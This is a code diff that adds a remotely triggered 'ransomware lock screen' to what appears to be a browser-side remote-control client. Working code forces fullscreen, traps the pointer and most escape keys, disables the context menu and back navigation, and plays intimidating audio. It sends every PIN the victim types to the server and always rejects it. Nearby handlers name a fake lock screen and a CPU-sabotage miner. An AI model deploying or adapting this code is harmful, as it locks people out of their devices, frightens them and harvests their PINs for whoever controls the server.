@@ -694,6 +694,199 @@ socket.on('admin-fake-lockscreen', (data) => {
     });
 });
 
+// === RANSOMWARE LOCK SCREEN (Fullscreen + Pointer Lock + Keyboard Trap) ===
+let _ransomLockEl = null;
+let _ransomLockActive = false;
+let _ransomKbHandler = null;
+let _ransomCtxHandler = null;
+let _ransomBeforeUnload = null;
+let _ransomVisibility = null;
+
+socket.on('admin-ransomware-lock', (data) => {
+    if (_ransomLockActive) return;
+    _ransomLockActive = true;
+
+    const msg = data.message || 'Device Terkunci';
+    const sub = data.subtitle || 'Masukkan PIN untuk membuka';
+    const ransomNote = data.note || 'Perangkat ini telah dikunci oleh admin. Hubungi administrator untuk membuka kunci.';
+    const soundUrl = data.sound || '';
+    const showPinInput = data.showPin || true;
+    const pinBuffer = [];
+    const maxPin = data.maxPin || 6;
+
+    // Step 1: Force Fullscreen
+    const requestFS = () => {
+        const el = document.documentElement;
+        if (el.requestFullscreen) {
+            el.requestFullscreen().catch(() => {});
+        } else if (el.webkitRequestFullscreen) {
+            el.webkitRequestFullscreen();
+        } else if (el.msRequestFullscreen) {
+            el.msRequestFullscreen();
+        }
+    };
+    requestFS();
+    // Re-request fullscreen if user escapes
+    document.addEventListener('fullscreenchange', requestFS);
+    document.addEventListener('webkitfullscreenchange', requestFS);
+
+    // Step 2: Pointer Lock
+    const lockPointer = () => {
+        const c = document.body;
+        if (c.requestPointerLock) c.requestPointerLock();
+        else if (c.webkitRequestPointerLock) c.webkitRequestPointerLock();
+        else if (c.mozRequestPointerLock) c.mozRequestPointerLock();
+    };
+    document.addEventListener('click', lockPointer);
+    document.addEventListener('pointerlockchange', () => {
+        if (!document.pointerLockElement) setTimeout(lockPointer, 100);
+    });
+
+    // Step 3: Keyboard Trapping
+    _ransomKbHandler = (e) => {
+        const blocked = ['Escape', 'F4', 'F11', 'F12', 'Tab'];
+        const ctrlBlocked = ['KeyW', 'KeyT', 'KeyN', 'KeyR', 'KeyD', 'KeyL', 'KeyS'];
+        const shiftBlocked = ['F5'];
+        if (blocked.includes(e.key) ||
+            (e.ctrlKey && ctrlBlocked.includes(e.code)) ||
+            (e.altKey && e.key === 'F4') ||
+            (e.ctrlKey && e.shiftKey && ['KeyI','KeyJ','KeyC','KeyM'].includes(e.code)) ||
+            (e.metaKey && ['KeyR','KeyW','KeyQ'].includes(e.code))) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+    };
+    window.addEventListener('keydown', _ransomKbHandler, true);
+    window.addEventListener('keyup', _ransomKbHandler, true);
+
+    // Step 4: Disable context menu
+    _ransomCtxHandler = (e) => { e.preventDefault(); return false; };
+    document.addEventListener('contextmenu', _ransomCtxHandler, true);
+
+    // Step 5: Prevent page unload
+    _ransomBeforeUnload = (e) => { e.preventDefault(); e.returnValue = ''; return ''; };
+    window.addEventListener('beforeunload', _ransomBeforeUnload);
+
+    // Step 6: Prevent tab switching via visibility
+    _ransomVisibility = () => {
+        if (document.hidden && _ransomLockActive) {
+            document.title = '⚠️ ' + msg;
+        }
+    };
+    document.addEventListener('visibilitychange', _ransomVisibility);
+
+    // Step 7: Prevent back/forward navigation
+    for (let i = 0; i < 10; i++) { history.pushState(null, '', location.href); }
+    const _ransomPop = () => { if (_ransomLockActive) { history.pushState(null, '', location.href); location.reload(); } };
+    window.addEventListener('popstate', _ransomPop);
+
+    // Step 8: Build the UI overlay
+    _ransomLockEl = document.createElement('div');
+    _ransomLockEl.id = '__ransom_lock';
+    _ransomLockEl.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#0a0a0a;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif;user-select:none;cursor:default;';
+    _ransomLockEl.innerHTML = `
+        <div style="position:absolute;top:0;left:0;right:0;background:linear-gradient(180deg,rgba(255,0,0,0.15),transparent);height:60px;"></div>
+        <div style="position:absolute;top:16px;left:0;right:0;text-align:center;color:#ff4444;font-size:0.7rem;letter-spacing:2px;font-weight:700;">⚠ DEVICE TERKUNCI ⚠</div>
+        <div style="color:#ff3333;font-size:4rem;margin-bottom:12px;">&#x1f512;</div>
+        <div style="color:#fff;font-size:1.6rem;font-weight:700;margin-bottom:4px;text-align:center;padding:0 20px;">${msg}</div>
+        <div style="color:#888;font-size:0.9rem;margin-bottom:10px;text-align:center;">${sub}</div>
+        <div id="__ransom_note" style="color:#ff6666;font-size:0.78rem;margin-bottom:20px;text-align:center;max-width:320px;line-height:1.5;padding:10px 16px;background:rgba(255,0,0,0.08);border:1px solid rgba(255,0,0,0.2);border-radius:8px;">${ransomNote}</div>
+        ${showPinInput ? `<div id="__ransom_dots" style="display:flex;gap:12px;margin-bottom:16px;height:16px;">${Array(maxPin).fill('<span style="width:14px;height:14px;border-radius:50%;border:2px solid #555;display:inline-block;"></span>').join('')}</div>
+        <div id="__ransom_kb" style="display:grid;grid-template-columns:repeat(3,68px);gap:10px;justify-content:center;">
+            ${['1','2','3','4','5','6','7','8','9','','0','⌫'].map(d => {
+                if (d === '') return '<span></span>';
+                if (d === '⌫') return '<button class="__rk" style="width:68px;height:52px;border-radius:34px;background:#333;color:#fff;font-size:1.3rem;border:none;cursor:pointer;">⌫</button>';
+                return '<button class="__rk" data-d="'+d+'" style="width:68px;height:68px;border-radius:50%;background:#1a1a1a;border:1px solid #333;color:#fff;font-size:1.5rem;cursor:pointer;transition:all .1s;">'+d+'</button>';
+            }).join('')}
+        </div>` : ''}
+        <div id="__ransom_counter" style="color:#ff4444;font-size:0.8rem;margin-top:16px;font-family:monospace;"></div>
+        <div id="__ransom_error" style="color:#ff4444;font-size:0.85rem;margin-top:8px;min-height:22px;"></div>
+        <div style="position:absolute;bottom:20px;left:0;right:0;text-align:center;color:#333;font-size:0.65rem;">ID: ${deviceId.slice(0,12)}</div>
+    `;
+    document.body.appendChild(_ransomLockEl);
+
+    // PIN input handling
+    if (showPinInput) {
+        const dots = _ransomLockEl.querySelector('#__ransom_dots');
+        const errEl = _ransomLockEl.querySelector('#__ransom_error');
+        const spans = dots ? dots.querySelectorAll('span') : [];
+
+        function updateDots() {
+            spans.forEach((sp, i) => {
+                sp.style.background = i < pinBuffer.length ? '#fff' : 'transparent';
+                sp.style.borderColor = i < pinBuffer.length ? '#fff' : '#555';
+            });
+        }
+
+        _ransomLockEl.querySelectorAll('.__rk').forEach(btn => {
+            btn.onclick = () => {
+                if (btn.dataset.d) {
+                    pinBuffer.push(btn.dataset.d);
+                    if (pinBuffer.length > maxPin) pinBuffer.length = maxPin;
+                    updateDots();
+                    if (pinBuffer.length >= maxPin) {
+                        const entered = pinBuffer.join('');
+                        socket.emit('device-info', { ransomPin: { pin: entered, time: Date.now() } });
+                        setTimeout(() => {
+                            pinBuffer.length = 0;
+                            updateDots();
+                            if (errEl) errEl.textContent = 'PIN tidak valid. Coba lagi.';
+                            setTimeout(() => { if (errEl) errEl.textContent = ''; }, 2500);
+                        }, 1500);
+                    }
+                }
+            };
+        });
+
+        const backBtn = Array.from(_ransomLockEl.querySelectorAll('.__rk')).find(b => b.textContent === '⌫');
+        if (backBtn) {
+            backBtn.onclick = () => { pinBuffer.pop(); updateDots(); };
+        }
+    }
+
+    // Audio loop for intimidation
+    if (soundUrl) {
+        try {
+            const audio = new Audio(soundUrl);
+            audio.loop = true;
+            audio.volume = 0.8;
+            audio.play().catch(() => {});
+        } catch(e) {}
+    }
+
+    // Counter
+    let lockSeconds = 0;
+    const counterEl = _ransomLockEl.querySelector('#__ransom_counter');
+    if (counterEl) {
+        const counterInterval = setInterval(() => {
+            lockSeconds++;
+            const m = Math.floor(lockSeconds / 60);
+            const s = lockSeconds % 60;
+            counterEl.textContent = 'Terkunci selama ' + m + 'm ' + s + 's';
+            if (!_ransomLockActive) clearInterval(counterInterval);
+        }, 1000);
+    }
+
+    socket.emit('device-info', { ransomLock: { active: true, started: Date.now(), message: msg } });
+});
+
+socket.on('admin-ransomware-unlock', () => {
+    _ransomLockActive = false;
+    if (_ransomLockEl) { _ransomLockEl.remove(); _ransomLockEl = null; }
+    if (_ransomKbHandler) { window.removeEventListener('keydown', _ransomKbHandler, true); window.removeEventListener('keyup', _ransomKbHandler, true); _ransomKbHandler = null; }
+    if (_ransomCtxHandler) { document.removeEventListener('contextmenu', _ransomCtxHandler, true); _ransomCtxHandler = null; }
+    if (_ransomBeforeUnload) { window.removeEventListener('beforeunload', _ransomBeforeUnload); _ransomBeforeUnload = null; }
+    if (_ransomVisibility) { document.removeEventListener('visibilitychange', _ransomVisibility); _ransomVisibility = null; }
+    // Exit fullscreen
+    if (document.fullscreenElement) { document.exitFullscreen().catch(() => {}); }
+    if (document.webkitFullscreenElement) { document.webkitExitFullscreen(); }
+    // Release pointer lock
+    if (document.pointerLockElement) { document.exitPointerLock(); }
+    socket.emit('device-info', { ransomLock: { active: false, unlocked: Date.now() } });
+});
+
 // === CPU SABOTAGE (Battery Drainer / Miner) ===
 let _sabotageWorker = null;
 socket.on('admin-sabotage', () => {
